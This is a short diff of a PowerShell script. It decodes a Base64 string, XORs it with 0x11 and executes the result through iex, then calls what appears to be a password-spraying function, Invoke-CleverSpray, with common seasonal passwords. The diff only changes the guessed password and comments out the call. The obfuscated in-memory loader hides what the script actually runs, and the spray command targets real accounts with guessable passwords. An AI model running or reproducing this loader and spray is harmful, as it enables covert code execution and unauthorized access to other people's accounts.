@@ -40,4 +40,4 @@ $EncodedText = "LTIcGzExMTFXZH9yZXh+fysxWH9nfnp0PFJ9dGd0Y0JhY3BoHBsxMTExUGRleX5j
 $file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
 $data = $enc.GetBytes($file)|%{$_-bXor0x11}
 iex ([System.Text.Encoding]::ASCII.GetString($data))
-Invoke-CleverSpray -Password Sarah2017 -limit 50
+#Invoke-CleverSpray -Password Summer2023! -limit 50
